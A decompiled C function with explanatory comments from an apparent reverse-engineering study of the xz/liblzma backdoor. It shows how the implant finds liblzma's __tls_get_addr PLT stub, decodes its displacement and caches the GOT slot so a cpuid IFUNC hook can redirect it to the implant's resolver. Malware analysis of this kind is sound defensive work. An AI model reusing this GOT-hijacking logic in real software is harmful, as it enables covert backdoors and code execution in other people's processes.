// /home/kali/xzre-ghidra/xzregh/103FA0_update_got_address.c
// Function: update_got_address @ 0x103FA0
// Calling convention: __stdcall
// Prototype: void * __stdcall update_got_address(elf_entry_ctx_t * entry_ctx)


/*
 * AutoDoc: Replays the relocated `__tls_get_addr` PLT stub to recover the live GOT pointer. Starting from the `_Lx86_coder_destroy` anchor plus the cached
 * `got_base_offset`, it locates the stub, determines whether the long-jump encoding is in use, and applies the resulting disp32 to
 * arrive at the GOT slot. When the stub still references the baked 0x2600 index, the helper trusts the computed address, caches it
 * in `ctx->got_ctx.tls_got_entry`, and returns the PLT pointer so follow-up code can repoint the cpuid IFUNC slot.
 */
#include "xzre_types.h"

void * update_got_address(elf_entry_ctx_t *entry_ctx)

{
  void *tls_get_addr_stub;
  ulong has_long_jump_prefix;
  long stub_disp_offset;
  void *resolved_tls_entry;
  
  // AutoDoc: Ensure the base offsets and sentinel GOT index are refreshed before touching the PLT stub.
  get_tls_get_addr_random_symbol_got_offset(entry_ctx);
  // AutoDoc: Pivot off `_Lx86_coder_destroy` plus the cached offset to land on liblzma’s `__tls_get_addr` PLT entry.
  tls_get_addr_stub = (void *)((long)&_Lx86_coder_destroy +
                   (_Llzma_block_uncomp_encode_0 - (entry_ctx->got_ctx).got_base_offset));
  // AutoDoc: Zero the cpuid slot bookkeeping so the subsequent pass always re-detects the live GOT slot.
  (entry_ctx->got_ctx).cpuid_got_slot = (void *)0x0;
  (entry_ctx->got_ctx).cpuid_slot_index = 0;
  // AutoDoc: Check whether the stub begins with `0F` so we know if the JMP uses the long (5-byte) encoding.
  has_long_jump_prefix = (ulong)(*(char *)((long)tls_get_addr_stub + 1) == '\x0f');
  stub_disp_offset = has_long_jump_prefix * 4;
  // AutoDoc: Adjust the displacement when the stub inserts an extra short JMP (0xF2) before the real disp32.
  if (*(char *)((long)tls_get_addr_stub + has_long_jump_prefix * 4) == -0xe) {
    stub_disp_offset = stub_disp_offset + 1;
  }
  resolved_tls_entry = (void *)0x0;
  // AutoDoc: Only trust the calculation when the stub still references the sentinel GOT index seeded earlier.
  if ((void *)(ulong)(*(ushort *)((long)tls_get_addr_stub + stub_disp_offset) + 1 & 0xffff) ==
      (entry_ctx->got_ctx).tls_got_entry) {
    // AutoDoc: Apply the stub’s disp32 to compute the absolute GOT pointer for `__tls_get_addr`.
    resolved_tls_entry = (void *)((long)tls_get_addr_stub + stub_disp_offset + -0x12 + (ulong)*(uint *)((long)tls_get_addr_stub + stub_disp_offset + 2));
  }
  // AutoDoc: Cache the resolved GOT entry so the cpuid hook can overwrite it with the implant’s resolver.
  (entry_ctx->got_ctx).tls_got_entry = resolved_tls_entry;
  return tls_get_addr_stub;
}

